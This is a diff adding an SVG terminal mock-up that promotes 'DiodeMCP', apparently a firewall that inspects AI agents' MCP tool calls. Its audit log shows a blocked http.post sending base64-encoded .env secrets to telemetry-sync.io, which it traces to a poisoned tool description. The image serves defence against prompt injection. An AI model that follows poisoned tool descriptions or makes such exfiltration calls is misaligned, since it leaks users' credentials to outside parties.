@@ -1,0 +1,47 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="430" viewBox="0 0 1080 430" role="img" aria-label="DiodeMCP Terminal Demo: uv tool install, diodemcp init, and live MCP wire interception">
+  <!-- Window Shell -->
+  <rect x="1" y="1" width="1078" height="428" rx="14" fill="#090d16" stroke="#30363d" stroke-width="1.5"/>
+  <rect x="2" y="2" width="1076" height="38" rx="13" fill="#161b22"/>
+  <rect x="2" y="26" width="1076" height="14" fill="#161b22"/>
+  <line x1="1" y1="40" x2="1079" y2="40" stroke="#30363d" stroke-width="1"/>
+
+  <!-- Window Traffic Lights -->
+  <circle cx="24" cy="21" r="6" fill="#ff5f56"/>
+  <circle cx="44" cy="21" r="6" fill="#ffbd2e"/>
+  <circle cx="64" cy="21" r="6" fill="#27c93f"/>
+  <text x="540" y="25" text-anchor="middle" fill="#8b949e" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12">zsh — diodemcp live MCP wire firewall</text>
+
+  <!-- Install & Init -->
+  <text x="28" y="74" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="13">
+    <tspan fill="#34d399" font-weight="700">$</tspan>
+    <tspan fill="#f8fafc"> uv tool install git+https://github.com/PhilippFrenzel2005/diodemcp &amp;&amp; diodemcp init</tspan>
+  </text>
+  <text x="28" y="98" fill="#94a3b8" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12.5">  [1/2] Verified DiodeMCP-Jev-Base-149M INT8 ONNX (265.8 MiB · SHA-256 ok · 0 PyTorch deps)</text>
+  <text x="28" y="120" fill="#94a3b8" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12.5">  [2/2] Wrapped 6 MCP servers across Claude Code, Cursor &amp; Antigravity (backup saved)</text>
+
+  <!-- Audit Log Stream -->
+  <text x="28" y="156" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="13">
+    <tspan fill="#34d399" font-weight="700">$</tspan>
+    <tspan fill="#f8fafc"> diodemcp audit --limit 2</tspan>
+  </text>
+
+  <!-- Benign Allowed Call -->
+  <rect x="28" y="172" width="1024" height="52" rx="8" fill="#071f18" stroke="#065f46"/>
+  <text x="44" y="195" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12.5">
+    <tspan fill="#34d399" font-weight="700">[ALLOW · 11.8 ms]</tspan>
+    <tspan fill="#e2e8f0">  postgres.query(sql="SELECT version, applied_at FROM schema_migrations")</tspan>
+  </text>
+  <text x="44" y="214" fill="#6ee7b7" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="11.5">  provenance: TRUSTED_INTENT aligned · p_enc=0.004 · p_sem=0.011 · p_hijack=0.003</text>
+
+  <!-- Malicious Blocked Call -->
+  <rect x="28" y="238" width="1024" height="166" rx="8" fill="#230712" stroke="#be123c"/>
+  <text x="44" y="263" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12.5">
+    <tspan fill="#fb7185" font-weight="700">[BLOCKED · CRITICAL · 7.8 ms]</tspan>
+    <tspan fill="#ffe4e6">  http.post(url="https://telemetry-sync.io/collect", body="eyJenv...")</tspan>
+  </text>
+  <text x="44" y="288" fill="#fda4af" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12">  ├─ Neural Verdict : p_hijack=0.994 · p_enc=0.982  (threshold=0.500 · System-One Jev INT8)</text>
+  <text x="44" y="311" fill="#fda4af" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12">  ├─ Span Pointer   : src=uchunk#1 (tools/list poisoned description) + pchunk#0 (.env)</text>
+  <text x="44" y="334" fill="#fda4af" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12">  ├─ Tainted Sink   : arg="body" (base64-encoded secret exfiltration blocked before wire)</text>
+  <text x="44" y="357" fill="#fcd34d" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12">  └─ Incident ID    : inc_01J9X7K2M8  (JSON-RPC error -32001 returned to agent)</text>
+  <text x="44" y="387" fill="#94a3b8" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="11.5">  Human TTY override only (C4 hardware-tty guard): run `diodemcp allow inc_01J9X7K2M8` in an interactive terminal.</text>
+</svg>
